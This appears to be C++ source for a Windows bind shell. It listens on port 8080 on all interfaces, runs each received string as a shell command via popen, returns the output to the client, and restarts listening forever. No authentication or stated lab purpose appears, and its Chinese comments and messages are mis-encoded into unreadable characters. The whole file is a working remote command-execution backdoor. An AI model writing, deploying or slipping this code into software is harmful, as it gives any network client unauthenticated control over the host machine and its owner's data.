#include <iostream>
#include <winsock2.h>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <stddef.h>
int main() {
	while(true)
	{
		WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return 1;
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(8080); // ѡ��һ���˿�

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to bind socket" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    if (listen(serverSocket, 5) == SOCKET_ERROR) {
        std::cerr << "Failed to listen" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "�ȴ��ͻ�������..." << std::endl;

    sockaddr_in clientAddr;
    int addrSize = sizeof(clientAddr);
    SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrSize);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to accept client connection" << std::endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    std::cout << "�ͻ���������" << std::endl;

    char buffer[1024];
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived == SOCKET_ERROR) {
            std::cerr << "Error in recv" << std::endl;
            break;
        } else if (bytesReceived == 0) {
            std::cout << "�ͻ����ѹر�����" << std::endl;
            break;
        }

        std::cout << "�ͻ�����Ϣ: " << buffer << std::endl;
		FILE* outputPipe = popen(buffer, "r");
		char buffers[128];
		std::string commandOutput;
	
	    // ��ȡ���������ÿһ�в��洢��commandOutput��
	    while (fgets(buffers, sizeof(buffers), outputPipe) != nullptr) {
	        commandOutput += buffers;
	    }
	
	    // �رչܵ�
	    pclose(outputPipe);

        // ���磬�ظ��ͻ���
        const char* replyMessage = commandOutput.data();
        send(clientSocket, replyMessage, strlen(replyMessage), 0);
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
	}
    return 0;
}
